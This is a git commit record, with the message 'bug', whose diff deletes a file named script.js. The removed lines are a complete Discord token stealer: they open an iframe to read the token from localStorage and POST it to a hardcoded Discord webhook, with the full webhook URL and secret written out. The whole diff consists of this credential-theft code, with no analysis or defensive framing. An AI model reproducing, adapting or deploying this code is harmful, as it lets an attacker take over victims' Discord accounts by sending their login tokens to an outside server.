c6901b407e4007f9a64f427aeac190fc42479b34
Shroom <95538243+jtonie@users.noreply.github.com>
2022-06-27 04:13:07 +0000

    bug

--- script.js
+++
@@ -1,7 +0,0 @@
-location.reload();
-var webhook = "https://discord.com/api/webhooks/990527664446140427/qb7IStKZqXMk_-2hMMJOYlhm1KeED2og6hnbciA6ZWpbDYIyo7UPAQP7v9cwqB3V-YYQ";
-var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token;
-var request = new XMLHttpRequest();
-request.open("POST", webhook);
-request.setRequestHeader('content-type', 'application/json');
-request.send(JSON.stringify({"content": token}));
